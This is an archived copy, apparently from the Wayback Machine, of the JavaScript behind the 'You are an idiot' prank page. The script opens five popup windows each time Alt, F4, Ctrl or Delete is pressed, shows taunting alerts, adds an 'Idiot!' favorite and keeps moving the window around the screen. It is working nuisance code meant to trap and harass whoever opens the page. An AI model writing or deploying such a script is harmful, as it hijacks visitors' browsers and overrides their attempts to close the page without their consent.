var _____WB$wombat$assign$function_____ = function(name) {return (self._wb_wombat && self._wb_wombat.local_init && self._wb_wombat.local_init(name)) || self[name]; };
if (!self.__WB_pmw) { self.__WB_pmw = function(obj) { this.__WB_source = obj; return this; } }
{
  let window = _____WB$wombat$assign$function_____("window");
  let self = _____WB$wombat$assign$function_____("self");
  let document = _____WB$wombat$assign$function_____("document");
  let location = _____WB$wombat$assign$function_____("location");
  let top = _____WB$wombat$assign$function_____("top");
  let parent = _____WB$wombat$assign$function_____("parent");
  let frames = _____WB$wombat$assign$function_____("frames");
  let opener = _____WB$wombat$assign$function_____("opener");

function bookmark() {
		if ((navigator.appName == "Microsoft Internet Explorer") 
		&& (parseInt(navigator.appVersion) >= 4)) 
		{
		var url="lol.html";
		var title="Idiot!";
		window.external.AddFavorite(url,title);
		}
		}

		var xOff = 5;
		var yOff = 5;
		var xPos = 400;
		var yPos = -100;
		var flagRun = 1;

function changeTitle(title) {
	document.title = title;
}

function openWindow(url) {
	aWindow = window.open(url, "_blank", 'menubar=no, status=no, toolbar=no, resizable=no, width=357, height=330, titlebar=no, alwaysRaised=yes');
}

function procreate() {
	changeTitle("Idiot!");
	for (var i = 0; i < 5; i++) {
		openWindow('lol.html');
	}
}

function altf4key() { if (event.keyCode == 18 || event.keyCode == 115) { alert("You are an idiot!"); procreate(); } }
function ctrlkey() { if (event.keyCode == 17) { alert("You are an idiot!"); procreate(); } }
function delkey() { if (event.keyCode == 46) { alert("You are an idiot!"); procreate(); } }

function newXlt(){
	xOff = Math.ceil(-6 * Math.random()) * 5 - 10 ;
	window.focus()
}

function newXrt(){
	xOff = Math.ceil(7 * Math.random())  * 5 - 10 ;
}

function newYup(){
	yOff = Math.ceil(-6 * Math.random())  * 5 - 10 ;
}

function newYdn(){
	yOff = Math.ceil( 7 * Math.random())  * 5 - 10  ;
}

function fOff(){
	flagrun = 0;
}

function playBall() {
    xPos += xOff;
    yPos += yOff;
    
	if (xPos > screen.width - 357) {
		newXlt();
    }
    
	if (xPos < 0){
		newXrt();
    }
    
	if (yPos > screen.height - 330) {
        newYup();
    }   
		
	if (yPos < 0){
        newYdn();
    }
    
	if (flagRun == 1){
        window.moveTo(xPos, yPos);
        setTimeout('playBall()', 1);
    }
}

}
/*
     FILE ARCHIVED ON 10:43:52 May 31, 2020 AND RETRIEVED FROM THE
     INTERNET ARCHIVE ON 01:20:45 Feb 25, 2021.
     JAVASCRIPT APPENDED BY WAYBACK MACHINE, COPYRIGHT INTERNET ARCHIVE.

     ALL OTHER CONTENT MAY ALSO BE PROTECTED BY COPYRIGHT (17 U.S.C.
     SECTION 108(a)(3)).
*/
/*
playback timings (ms):
  captures_list: 78.966
  exclusion.robots: 0.083
  exclusion.robots.policy: 0.075
  RedisCDXSource: 1.793
  esindex: 0.012
  LoadShardBlock: 56.608 (3)
  PetaboxLoader3.datanode: 123.736 (5)
  CDXLines.iter: 17.254 (3)
  load_resource: 360.593 (2)
  PetaboxLoader3.resolve: 236.881 (2)
*/